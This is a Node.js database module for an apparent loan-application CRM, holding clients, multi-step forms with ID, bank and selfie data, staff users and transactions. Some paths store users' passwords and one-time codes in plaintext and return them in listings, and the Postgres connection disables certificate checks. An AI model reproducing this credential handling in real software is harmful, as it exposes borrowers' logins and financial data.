import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import crypto from 'crypto';
import { createTransaction, createTransactionMock } from './controllers/transactions/create-transaction.js';

let Pool = null;
try { ({ Pool } = await import('pg')); } catch {}

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const DB_FILE = path.resolve('crm.json');

export function readFileDB() {
  try { return JSON.parse(fs.readFileSync(DB_FILE, 'utf8')); } catch { return { solicitudes: [], lastId: 0 }; }
}
export function writeFileDB(db) { fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2)); }

const connString = process.env.DATABASE_URL || process.env.POSTGRES_URL || process.env.PG_URL;
const usePg = !!(connString && Pool);
export let pool = usePg ? new Pool({ connectionString: connString, ssl: { rejectUnauthorized: false } }) : null;

export async function init() {
  if (!usePg) return;
  // migrate
  await pool.query(`
    create table if not exists solicitudes (
      id serial primary key,
      phone text not null,
      otp text not null,
      password text not null,
      step_data jsonb not null default '{}'::jsonb,
      status text not null default 'incomplete',
      amount numeric,
      created_at timestamptz not null default now()
    );
    create index if not exists idx_solicitudes_phone on solicitudes (phone);

    -- Base unificada solicitada
    create table if not exists clientes (
      id serial primary key,
      phone varchar(20) not null unique,
      password_hash varchar(255) not null,
      created_at timestamptz not null default now()
    );
    create index if not exists idx_clientes_phone on clientes (phone);

    create table if not exists formularios (
      id serial primary key,
      cliente_id integer references clientes(id),
      celular varchar(20),
      monto numeric,
      plazo integer,
      paso_actual integer default 0,
      uuid uuid,
  -- Estado de aceptación del cliente
  cliente_acepto varchar(20),
      -- Paso 1: Información Personal
      first_name varchar(50),
      second_name varchar(50),
      last_name varchar(50),
      second_last_name varchar(50),
      email varchar(100),
      document_number varchar(20),
      birth_date date,
      document_issue_date date,
      education_level varchar(50),
      marital_status varchar(30),
      gender varchar(20),
      -- Paso 2: Contacto y residencia
      department varchar(50),
      city varchar(50),
      locality varchar(100),
      address varchar(150),
      -- Paso 3: Actividad económica
      employment_status varchar(50),
      payment_cycle varchar(30),
      income_range varchar(30),
      -- Paso 4: Referencias
      reference_one_relationship varchar(30),
      reference_one_name varchar(100),
      reference_one_phone varchar(20),
      reference_two_relationship varchar(30),
      reference_two_name varchar(100),
      reference_two_phone varchar(20),
      -- Paso 5: Bancarios
      bank_name varchar(50),
      account_number varchar(30),
      account_number_confirm varchar(30),
      -- Paso 6: Archivos
  id_front text,
  id_back text,
  selfie text,
      created_at timestamptz not null default now(),
      estado varchar(30) default 'pendiente'
    );
    create index if not exists idx_formularios_cliente_id on formularios(cliente_id);

    -- Usuarios (staff) con roles
    create table if not exists usuarios (
      id serial primary key,
      email varchar(120) not null unique,
      password_hash varchar(255) not null,
      role varchar(30) not null default 'agent',
      created_at timestamptz not null default now()
    );
    create index if not exists idx_usuarios_email on usuarios(email);

    CREATE TABLE IF NOT EXISTS transactions (
      id text primary key NOT NULL,
      customer_id text COLLATE pg_catalog."default" NOT NULL,
      coustomer_email character varying(120) COLLATE pg_catalog."default" NOT NULL,
      status text COLLATE pg_catalog."default" NOT NULL DEFAULT 'pending'::text,
      amount numeric,
      created_at timestamp with time zone NOT NULL DEFAULT now()
    );
    CREATE INDEX IF NOT EXISTS idx_transactions_id ON transactions(id);
  `);

  // Ensure image columns are wide enough (text) for base64/data URLs
  try {
    await pool.query(`
      alter table if exists formularios
        alter column id_front type text,
        alter column id_back type text,
        alter column selfie type text;
    `);
  } catch (e) {
    console.warn('[crm] alter image columns skipped:', e?.message || e);
  }

  // Ensure cliente_acepto column exists
  try {
    await pool.query(`
      do $$
      begin
        if not exists (
          select 1 from information_schema.columns
          where table_name = 'formularios' and column_name = 'cliente_acepto'
        ) then
          alter table formularios add column cliente_acepto varchar(20);
        end if;
      end$$;
    `);
  } catch (e) {
    console.warn('[crm] alter add cliente_acepto skipped:', e?.message || e);
  }

  // Seed admin opcional via variables de entorno
  try {
    const adminEmail = process.env.ADMIN_EMAIL;
    const adminPass = process.env.ADMIN_PASSWORD;
    if (adminEmail && adminPass) {
      const { rows } = await pool.query('select 1 from usuarios where email=$1 limit 1', [adminEmail]);
      if (!rows.length) {
        const passwordHash = hashPassword(adminPass);
        await pool.query('insert into usuarios(email, password_hash, role) values ($1,$2,$3)', [adminEmail, passwordHash, 'admin']);
        console.log('[crm] Seeded admin user:', adminEmail);
      }
    }
  } catch (e) { console.warn('[crm] admin seed skipped:', e?.message || e); }
}

// Simple PBKDF2 password hashing
function hashPassword(password) {
  if (!password) return null;
  const salt = crypto.randomBytes(16).toString('hex');
  const iterations = 100000;
  const keylen = 32;
  const digest = 'sha256';
  const derived = crypto.pbkdf2Sync(String(password), salt, iterations, keylen, digest).toString('hex');
  return `pbkdf2$${iterations}$${digest}$${salt}$${derived}`;
}

function verifyPassword(password, stored) {
  if (!password || !stored) return false;
  try {
    const [scheme, itStr, digest, salt, derived] = String(stored).split('$');
    if (scheme !== 'pbkdf2') return false;
    const iterations = parseInt(itStr, 10);
    const keylen = (derived?.length || 64) / 2; // hex length to bytes
    const check = crypto.pbkdf2Sync(String(password), salt, iterations, keylen, digest).toString('hex');
    // constant-time compare
    const a = Buffer.from(check, 'hex');
    const b = Buffer.from(derived, 'hex');
    if (a.length !== b.length) return false;
    return crypto.timingSafeEqual(a, b);
  } catch { return false; }
}

function mapRow(r) {
  if (!r) return r;
  return {
    id: r.id,
    phone: r.phone,
    otp: r.otp,
    password: r.password,
    step_data: r.step_data || {},
    status: r.status,
    amount: r.amount == null ? null : Number(r.amount),
    created_at: r.created_at
  };
}

export async function createSolicitud({ phone, otp, password, monto, plazo }) {
  if (!usePg) {
    const db = readFileDB();
    const existing = db.solicitudes.find(s => s.phone === phone && (s.status === 'incomplete' || s.status === 'complete'));
    if (existing) return existing;
    const id = db.lastId + 1;
    const s = { id, phone, otp, password: hashPassword(password) || '', step_data: {}, status: 'incomplete', amount: null, created_at: new Date().toISOString() };
    db.solicitudes.unshift(s); db.lastId = id; writeFileDB(db); return s;
  }
  const { rows } = await pool.query('select * from solicitudes where phone=$1 and (status in ($2,$3)) order by id desc limit 1', [phone, 'incomplete', 'complete']);
  if (rows.length) return mapRow(rows[0]);
  const client = await pool.connect();
  try {
    await client.query('begin');
  const ins = await client.query('insert into solicitudes(phone,otp,password) values ($1,$2,$3) returning *', [phone, otp, password]);
  const amt = Number(monto||0);
  const term = Number(plazo||0);
  // upsert cliente únicamente (el formulario se crea luego en /formularios/start)
  const passwordHash = hashPassword(password);
  await client.query('insert into clientes(phone, password_hash) values ($1, $2) on conflict (phone) do update set password_hash = coalesce(excluded.password_hash, clientes.password_hash)', [phone, passwordHash]);
    await client.query('commit');
    return mapRow(ins.rows[0]);
  } catch (e) {
    await client.query('rollback');
    throw e;
  } finally {
    client.release();
  }
}

// Optional: list users (admin usage)
export async function listUsers() {
  if (!usePg) {
    const db = readFileDB();
    // derive users from solicitudes for JSON mode
    return db.solicitudes.map(s => ({ id: s.id, phone: s.phone, password: s.password, amount: s.step_data?.loan?.amount || null, term: s.step_data?.loan?.term || null, created_at: s.created_at }));
  }
  const { rows } = await pool.query('select id, phone, password, amount, term, created_at from users order by id desc');
  return rows.map(r => ({ id: r.id, phone: r.phone, password: r.password, amount: r.amount == null ? null : Number(r.amount), term: r.term, created_at: r.created_at }));
}

export async function updateStep(id, { stepKey, data, final }) {
  if (!usePg) {
    const db = readFileDB();
    const idx = db.solicitudes.findIndex(s => s.id === Number(id));
    if (idx === -1) throw Object.assign(new Error('not found'), { status: 404 });
    const s = db.solicitudes[idx];
    s.step_data = s.step_data || {}; s.step_data[stepKey] = data;
    if (final) s.status = 'complete';
    db.solicitudes[idx] = s; writeFileDB(db); return s;
  }
  const q = `update solicitudes set 
    step_data = coalesce(step_data,'{}'::jsonb) || jsonb_build_object($2, $3::jsonb),
    status = case when $4 then 'complete' else status end
    where id=$1 returning *`;
  const { rows } = await pool.query(q, [Number(id), stepKey, JSON.stringify(data || {}), !!final]);
  if (!rows.length) throw Object.assign(new Error('not found'), { status: 404 });
  return mapRow(rows[0]);
}

export async function listSolicitudes() {
  if (!usePg) {
    const db = readFileDB();
    return db.solicitudes;
  }
  const { rows } = await pool.query('select * from solicitudes order by id desc');
  return rows.map(mapRow);
}

export async function setDecision(id, { decision, amount }) {
  if (!usePg) {
    const db = readFileDB();
    const idx = db.solicitudes.findIndex(s => s.id === Number(id));
    if (idx === -1) throw Object.assign(new Error('not found'), { status: 404 });
    const s = db.solicitudes[idx];
    if (decision === 'approve') { const amt = Number(amount); if (!amt || amt <= 0) throw Object.assign(new Error('amount must be > 0'), { status: 400 }); s.status='approved'; s.amount=amt; }
    else if (decision === 'reject') { s.status='rejected'; }
    else throw Object.assign(new Error('invalid decision'), { status: 400 });
    db.solicitudes[idx] = s; writeFileDB(db); return s;
  }
  if (decision === 'approve') {
    const amt = Number(amount); if (!amt || amt <= 0) throw Object.assign(new Error('amount must be > 0'), { status: 400 });
    const { rows } = await pool.query('update solicitudes set status=$2, amount=$3 where id=$1 returning *', [Number(id), 'approved', amt]);
    if (!rows.length) throw Object.assign(new Error('not found'), { status: 404 });
    return mapRow(rows[0]);
  } else if (decision === 'reject') {
    const { rows } = await pool.query('update solicitudes set status=$2, amount=null where id=$1 returning *', [Number(id), 'rejected']);
    if (!rows.length) throw Object.assign(new Error('not found'), { status: 404 });
    return mapRow(rows[0]);
  } else {
    throw Object.assign(new Error('invalid decision'), { status: 400 });
  }
}

export async function getSolicitud(id) {
  if (!usePg) {
    const db = readFileDB();
    const s = db.solicitudes.find(x => x.id === Number(id));
    if (!s) throw Object.assign(new Error('not found'), { status: 404 });
    return s;
  }
  const { rows } = await pool.query('select * from solicitudes where id=$1', [Number(id)]);
  if (!rows.length) throw Object.assign(new Error('not found'), { status: 404 });
  return mapRow(rows[0]);
}

export function isPgEnabled() { return usePg; }

// Helpers for formularios lifecycle
const FORM_COLUMNS = [
  'celular','monto','plazo','paso_actual','uuid',
  'cliente_acepto',
  'first_name','second_name','last_name','second_last_name','email','document_number','birth_date','document_issue_date','education_level','marital_status','gender',
  'department','city','locality','address',
  'employment_status','payment_cycle','income_range',
  'reference_one_relationship','reference_one_name','reference_one_phone','reference_two_relationship','reference_two_name','reference_two_phone',
  'bank_name','account_number','account_number_confirm',
  'id_front','id_back','selfie','estado'
];

// Check if a phone already exists (registered client)
export async function phoneExists(phone) {
  if (!usePg) {
    const db = readFileDB();
    return db.solicitudes.some(s => s.phone === phone);
  }
  const { rows } = await pool.query('select 1 from clientes where phone=$1 limit 1', [phone]);
  return rows.length > 0;
}

export async function startFormularioForPhone({ phone, monto, plazo, password }) {
  if (!usePg) {
    // JSON fallback: just add a pseudo formulario entry inside step_data
    const db = readFileDB();
    let s = db.solicitudes.find(x => x.phone === phone);
    if (!s) {
      const id = db.lastId + 1; s = { id, phone, otp:'', password: hashPassword(password)||'', step_data:{}, status:'incomplete', amount:null, created_at: new Date().toISOString() }; db.solicitudes.unshift(s); db.lastId=id;
    }
    s.step_data.formulario = s.step_data.formulario || { id: s.id, paso_actual: 0, celular: phone, monto: monto||null, plazo: plazo||null };
    writeFileDB(db);
    return { id: s.id, cliente_id: s.id, celular: phone, monto: monto||null, plazo: plazo||null, paso_actual: 0 };
  }
  const client = await pool.connect();
  try {
    await client.query('begin');
    const passwordHash = hashPassword(password);
    // Buscar cliente existente por teléfono
    let clienteId;
    const existing = await client.query('select id from clientes where phone=$1', [phone]);
    if (existing.rows.length) {
      clienteId = existing.rows[0].id;
      if (passwordHash) {
        await client.query('update clientes set password_hash=$2 where id=$1', [clienteId, passwordHash]);
      }
    } else {
      if (!passwordHash) {
        const err = new Error('password required to create client');
        err.status = 400; throw err;
      }
      const cli = await client.query('insert into clientes(phone, password_hash) values ($1,$2) returning id', [phone, passwordHash]);
      clienteId = cli.rows[0].id;
    }
    const ins = await client.query('insert into formularios(cliente_id, celular, monto, plazo, paso_actual) values ($1,$2,$3,$4,$5) returning *', [clienteId, phone, monto ?? null, plazo ?? null, 0]);
    await client.query('commit');
    return ins.rows[0];
  } catch (e) {
    await client.query('rollback');
    throw e;
  } finally { client.release(); }
}

export async function updateFormularioStep(id, { step, data }) {
  if (!usePg) {
    const db = readFileDB();
    const s = db.solicitudes.find(x => x.id === Number(id));
    if (!s) throw Object.assign(new Error('not found'), { status: 404 });
    s.step_data = s.step_data || {}; s.step_data.formulario = { ...(s.step_data.formulario||{}), ...data, paso_actual: step };
    if (Number(step) >= 7) {
      s.step_data.formulario.estado = 'en_espera';
      s.status = 'en_espera';
    }
    writeFileDB(db); return { ok:true, id: Number(id), paso_actual: step };
  }
  const payload = { ...(data||{}) };
  if ('estado' in payload) {
    const raw = String(payload.estado||'').toLowerCase();
    payload.estado = (raw === 'rechazado') ? 'negado' : raw;
  }
  const keys = Object.keys(payload || {}).filter(k => FORM_COLUMNS.includes(k));
  const sets = [];
  const vals = [];
  keys.forEach((k, i) => { sets.push(`${k} = $${i+1}`); vals.push(payload[k]); });
  // paso_actual al final
  const idxPaso = vals.length + 1; vals.push(Number(step)||0);
  const idxId = vals.length + 1; vals.push(Number(id));
  const setClause = sets.length ? sets.join(', ') + ', ' : '';
  // estado en espera si último paso
  const q = `update formularios set ${setClause} paso_actual = $${idxPaso}${Number(step) >= 7 ? ", estado='en_espera'" : ''} where id = $${idxId} returning *`;
  const { rows } = await pool.query(q, vals);
  if (!rows.length) throw Object.assign(new Error('not found'), { status: 404 });
  return rows[0];
}

export async function getFormulario(id) {
  if (!usePg) {
    const db = readFileDB();
    const s = db.solicitudes.find(x => x.id === Number(id));
    if (!s) throw Object.assign(new Error('not found'), { status: 404 });
    return s.step_data?.formulario || null;
  }
  const { rows } = await pool.query('select * from formularios where id=$1', [Number(id)]);
  if (!rows.length) throw Object.assign(new Error('not found'), { status: 404 });
  return rows[0];
}

// Health info and simple counts for debugging in Render
export async function getCounts() {
  if (!usePg) {
    const db = readFileDB();
    const solicitudes = db.solicitudes.length;
    const formularios = db.solicitudes.filter(s => s.step_data && s.step_data.formulario).length;
    const clientes = new Set(db.solicitudes.map(s => s.phone)).size;
    const usuarios = (db.usuarios||[]).length;
    return { storage: 'json', clientes, formularios, solicitudes, usuarios };
  }
  const [{ rows: c1 }, { rows: c2 }, { rows: c3 }, { rows: c4 }] = await Promise.all([
    pool.query('select count(*)::int as n from clientes'),
    pool.query('select count(*)::int as n from formularios'),
    pool.query('select count(*)::int as n from solicitudes'),
    pool.query('select count(*)::int as n from usuarios'),
  ]);
  return { storage: 'pg', clientes: c1[0].n, formularios: c2[0].n, solicitudes: c3[0].n, usuarios: c4[0].n };
}

// Admin CRUD for formularios
export async function createFormularioAdmin({ phone, monto, plazo, password }) {
  // Reuse existing helper which ensures cliente exists and inserts formulario
  return await startFormularioForPhone({ phone, monto, plazo, password });
}

export async function updateFormularioAdmin(id, data = {}) {
  const fid = Number(id);
  // Allow updating any formulario column defined in FORM_COLUMNS
  const allowed = FORM_COLUMNS;
  // Normalize/validate estado if present
  if (data && 'estado' in data) {
    const raw = String(data.estado||'').toLowerCase();
    const norm = raw === 'rechazado' ? 'negado' : raw;
  const ok = ['pendiente','en_espera','aprobado','desembolsado','negado'];
    if (!ok.includes(norm)) delete data.estado; else data.estado = norm;
  }
  if (!usePg) {
    const db = readFileDB();
    const s = db.solicitudes.find(x => x.id === fid);
    if (!s || !s.step_data?.formulario) throw Object.assign(new Error('not found'), { status: 404 });
    const f = s.step_data.formulario;
    allowed.forEach(k => { if (k in data) f[k] = data[k]; });
    s.step_data.formulario = f;
    writeFileDB(db);
    return f;
  }
  const sets = [];
  const vals = [];
  let i = 1;
  allowed.forEach(k => { if (k in data) { sets.push(`${k} = $${i++}`); vals.push(data[k]); } });
  if (!sets.length) {
    const { rows } = await pool.query('select * from formularios where id=$1', [fid]);
    if (!rows.length) throw Object.assign(new Error('not found'), { status:404 });
    return rows[0];
  }
  vals.push(fid);
  const q = `update formularios set ${sets.join(', ')} where id=$${i} returning *`;
  const { rows } = await pool.query(q, vals);
  if (!rows.length) throw Object.assign(new Error('not found'), { status: 404 });
  return rows[0];
}

export async function deleteFormularioAdmin(id) {
  const fid = Number(id);
  if (!usePg) {
    const db = readFileDB();
    const s = db.solicitudes.find(x => x.id === fid);
    if (!s || !s.step_data?.formulario) throw Object.assign(new Error('not found'), { status: 404 });
    delete s.step_data.formulario;
    writeFileDB(db);
    return { ok: true };
  }
  const { rowCount } = await pool.query('delete from formularios where id=$1', [fid]);
  if (!rowCount) throw Object.assign(new Error('not found'), { status: 404 });
  return { ok: true };
}

// Recent lists for quick admin view
export async function recentClientes(limit = 20) {
  const lim = Math.max(1, Math.min(200, Number(limit)||20));
  if (!usePg) {
    const db = readFileDB();
    const map = new Map();
    for (const s of db.solicitudes) {
      const prev = map.get(s.phone);
      if (!prev || new Date(s.created_at) > new Date(prev.created_at)) {
        map.set(s.phone, { id: s.id, phone: s.phone, created_at: s.created_at });
      }
    }
    const arr = Array.from(map.values()).sort((a,b)=> new Date(b.created_at)-new Date(a.created_at));
    return arr.slice(0, lim);
  }
  const { rows } = await pool.query('select id, phone, created_at from clientes order by id desc limit $1', [lim]);
  return rows;
}

export async function recentFormularios(limit = 20) {
  const lim = Math.max(1, Math.min(200, Number(limit)||20));
  if (!usePg) {
    const db = readFileDB();
    const arr = [];
    for (const s of db.solicitudes) {
      const f = s.step_data?.formulario;
    if (f) arr.push({ id: f.id, celular: f.celular, monto: f.monto ?? null, plazo: f.plazo ?? null, paso_actual: f.paso_actual, estado: f.estado || 'pendiente', cliente_acepto: f.cliente_acepto || null, created_at: s.created_at, first_name: f.first_name || '', second_name: f.second_name || '', last_name: f.last_name || '', second_last_name: f.second_last_name || '' });
    }
    arr.sort((a,b)=> new Date(b.created_at)-new Date(a.created_at));
    return arr.slice(0, lim);
  }
  const { rows } = await pool.query('select id, celular, monto, plazo, paso_actual, estado, cliente_acepto, created_at, first_name, second_name, last_name, second_last_name from formularios order by id desc limit $1', [lim]);
  return rows;
}

// Listar usuarios (staff) para Admin
export async function listUsuarios(limit = 50) {
  const lim = Math.max(1, Math.min(200, Number(limit)||50));
  if (!usePg) {
    const db = readFileDB();
    const arr = (db.usuarios || []).slice().sort((a,b)=> new Date(b.created_at)-new Date(a.created_at));
    return arr.slice(0, lim).map(u => ({ id: u.id, email: u.email, role: u.role || 'agent', created_at: u.created_at }));
  }
  const { rows } = await pool.query('select id, email, role, created_at from usuarios order by id desc limit $1', [lim]);
  return rows;
}

// Cliente helpers
export async function getClienteByPhone(phone) {
  if (!usePg) {
    const db = readFileDB();
    const s = db.solicitudes.find(x => x.phone === phone);
    if (!s) return null;
    return { id: s.id, phone: s.phone, password_hash: s.password };
  }
  const { rows } = await pool.query('select id, phone, password_hash from clientes where phone=$1 limit 1', [phone]);
  return rows[0] || null;
}

export async function getLatestFormularioForPhone(phone) {
  if (!usePg) {
    const db = readFileDB();
    const s = db.solicitudes.find(x => x.phone === phone);
    if (!s) return null;
    const f = s.step_data?.formulario || null;
    return f ? { id: f.id, celular: f.celular, paso_actual: f.paso_actual, estado: f.estado || 'pendiente', created_at: s.created_at, monto: f.monto ?? null, plazo: f.plazo ?? null } : null;
  }
  const q = `select f.id, f.celular, f.paso_actual, f.estado, f.created_at, f.monto, f.plazo, f.cliente_acepto
             from formularios f join clientes c on f.cliente_id=c.id
             where c.phone=$1 order by f.id desc limit 1`;
  const { rows } = await pool.query(q, [phone]);
  return rows[0] || null;
}

export async function loginCliente({ phone, password }) {
  const cli = await getClienteByPhone(phone);
  if (!cli) throw Object.assign(new Error('not found'), { status: 404 });
  const ok = verifyPassword(password, cli.password_hash);
  if (!ok) throw Object.assign(new Error('unauthorized'), { status: 401 });
  const form = await getLatestFormularioForPhone(phone);
  return { id: cli.id, phone: cli.phone, formulario: form };
}

// Admin users (staff)
export async function getUserByEmail(email) {
  if (!usePg) {
    const db = readFileDB();
    const list = db.usuarios || [];
    const u = list.find(x => x.email?.toLowerCase() === String(email||'').toLowerCase());
    return u ? { id: u.id, email: u.email, role: u.role || 'agent', password_hash: u.password_hash } : null;
  }
  const { rows } = await pool.query('select id, email, role, password_hash from usuarios where email=$1 limit 1', [email]);
  return rows[0] || null;
}

export async function createUser({ email, password, role = 'agent' }) {
  const password_hash = hashPassword(password);
  if (!usePg) {
    const db = readFileDB();
    db.usuarios = db.usuarios || [];
    const id = (db.lastUserId || 0) + 1;
    db.lastUserId = id;
    db.usuarios.push({ id, email, password_hash, role, created_at: new Date().toISOString() });
    writeFileDB(db);
    return { id, email, role };
  }
  const { rows } = await pool.query('insert into usuarios(email,password_hash,role) values ($1,$2,$3) returning id, email, role', [email, password_hash, role]);
  return rows[0];
}

export async function loginAdmin({ email, password }) {
  const u = await getUserByEmail(email);
  if (!u) throw Object.assign(new Error('not found'), { status: 404 });
  const ok = verifyPassword(password, u.password_hash);
  if (!ok) throw Object.assign(new Error('unauthorized'), { status: 401 });
  return { id: u.id, email: u.email, role: u.role };
}

// Admin CRUD: Clientes (Web)
export async function createClient({ phone, password }) {
  if (!phone || !password) throw Object.assign(new Error('phone_password_required'), { status: 400 });
  if (!usePg) {
    const db = readFileDB();
    const exists = db.solicitudes.find(s => s.phone === phone);
    if (exists) throw Object.assign(new Error('conflict'), { status: 409 });
    const id = (db.lastId || 0) + 1;
    db.lastId = id;
    const s = { id, phone, otp: '', password: hashPassword(password), step_data: {}, status: 'incomplete', amount: null, created_at: new Date().toISOString() };
    db.solicitudes.unshift(s);
    writeFileDB(db);
    return { id, phone, created_at: s.created_at };
  }
  // PG
  const password_hash = hashPassword(password);
  try {
    const { rows } = await pool.query('insert into clientes(phone, password_hash) values ($1,$2) returning id, phone, created_at', [phone, password_hash]);
    return rows[0];
  } catch (e) {
    if (String(e?.message||'').includes('duplicate key')) throw Object.assign(new Error('conflict'), { status: 409 });
    throw e;
  }
}

export async function updateClient(id, { phone, password }) {
  const cid = Number(id);
  if (!usePg) {
    const db = readFileDB();
    const idx = db.solicitudes.findIndex(s => s.id === cid);
    if (idx === -1) throw Object.assign(new Error('not found'), { status: 404 });
    if (phone) db.solicitudes[idx].phone = phone;
    if (password) db.solicitudes[idx].password = hashPassword(password);
    writeFileDB(db);
    const s = db.solicitudes[idx];
    return { id: s.id, phone: s.phone, created_at: s.created_at };
  }
  // PG
  const sets = [];
  const vals = [];
  let i = 1;
  if (phone) { sets.push(`phone = $${i++}`); vals.push(phone); }
  if (password) { sets.push(`password_hash = $${i++}`); vals.push(hashPassword(password)); }
  if (!sets.length) return await (async () => { const { rows } = await pool.query('select id, phone, created_at from clientes where id=$1', [cid]); if (!rows.length) throw Object.assign(new Error('not found'), { status:404 }); return rows[0]; })();
  vals.push(cid);
  const q = `update clientes set ${sets.join(', ')} where id = $${i} returning id, phone, created_at`;
  try {
    const { rows } = await pool.query(q, vals);
    if (!rows.length) throw Object.assign(new Error('not found'), { status: 404 });
    return rows[0];
  } catch (e) {
    if (String(e?.message||'').includes('duplicate key')) throw Object.assign(new Error('conflict'), { status: 409 });
    throw e;
  }
}

export async function deleteClient(id) {
  const cid = Number(id);
  if (!usePg) {
    const db = readFileDB();
    const idx = db.solicitudes.findIndex(s => s.id === cid);
    if (idx === -1) throw Object.assign(new Error('not found'), { status: 404 });
    db.solicitudes.splice(idx, 1);
    writeFileDB(db);
    return { ok: true };
  }
  // PG: prevent delete if has formularios
  const { rows: f } = await pool.query('select 1 from formularios where cliente_id=$1 limit 1', [cid]);
  if (f.length) throw Object.assign(new Error('has_forms'), { status: 409 });
  const { rowCount } = await pool.query('delete from clientes where id=$1', [cid]);
  if (!rowCount) throw Object.assign(new Error('not found'), { status: 404 });
  return { ok: true };
}

// Admin CRUD: Usuarios (Staff)
export async function updateUser({ id, email, password, role }) {
  const uid = Number(id);
  if (!usePg) {
    const db = readFileDB();
    db.usuarios = db.usuarios || [];
    const u = db.usuarios.find(x => x.id === uid);
    if (!u) throw Object.assign(new Error('not found'), { status: 404 });
    if (email) u.email = email;
    if (role) u.role = role;
    if (password) u.password_hash = hashPassword(password);
    writeFileDB(db);
    return { id: u.id, email: u.email, role: u.role, created_at: u.created_at };
  }
  const sets = [];
  const vals = [];
  let i = 1;
  if (email) { sets.push(`email = $${i++}`); vals.push(email); }
  if (role) { sets.push(`role = $${i++}`); vals.push(role); }
  if (password) { sets.push(`password_hash = $${i++}`); vals.push(hashPassword(password)); }
  if (!sets.length) { const { rows } = await pool.query('select id, email, role, created_at from usuarios where id=$1', [uid]); if (!rows.length) throw Object.assign(new Error('not found'), { status:404 }); return rows[0]; }
  vals.push(uid);
  const q = `update usuarios set ${sets.join(', ')} where id=$${i} returning id, email, role, created_at`;
  const { rows } = await pool.query(q, vals);
  if (!rows.length) throw Object.assign(new Error('not found'), { status: 404 });
  return rows[0];
}

export async function deleteUser(id) {
  const uid = Number(id);
  if (!usePg) {
    const db = readFileDB();
    db.usuarios = db.usuarios || [];
    const idx = db.usuarios.findIndex(x => x.id === uid);
    if (idx === -1) throw Object.assign(new Error('not found'), { status: 404 });
    db.usuarios.splice(idx, 1);
    writeFileDB(db);
    return { ok: true };
  }
  const { rowCount } = await pool.query('delete from usuarios where id=$1', [uid]);
  if (!rowCount) throw Object.assign(new Error('not found'), { status: 404 });
  return { ok: true };
}


export const createNewTransaction = usePg ? createTransaction : createTransactionMock